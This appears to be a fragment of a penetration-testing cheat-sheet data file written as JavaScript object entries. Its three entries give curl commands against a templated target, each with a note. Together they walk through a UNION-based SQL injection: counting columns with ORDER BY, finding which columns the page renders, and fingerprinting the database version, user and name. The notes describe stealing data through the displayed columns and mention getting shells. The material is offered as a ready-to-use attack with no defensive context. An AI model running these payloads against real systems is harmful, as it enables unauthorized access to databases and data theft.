Object.assign(n[1804],{"tool":"curl","run":"curl -s 'http://{{target}}/page.php?id=1%20ORDER%20BY%205--%20-'","note":"COLUMN COUNT: increment the number until you get an error (unknown column) — count = last number that worked. Alternative: UNION SELECT NULL / NULL,NULL / NULL,NULL,NULL until no error."});
Object.assign(n[1805],{"tool":"curl","run":"curl -s 'http://{{target}}/page.php?id=-1%20UNION%20SELECT%201,2,3,4--%20-'","note":"DISPLAY COLUMNS: id=-1 (invalid) forces the page to render YOUR row. The numbers that appear on the page are the columns you can steal data through. Use NULL in place of numbers on MSSQL/Postgres."});
Object.assign(n[1806],{"tool":"curl","run":"curl -s 'http://{{target}}/page.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-'","note":"FINGERPRINT: replace display columns with version() (or @@version), user(), database(). Tells you DBMS flavor + whether the DB user is root (file ops, shells — see the file-ops card)."});
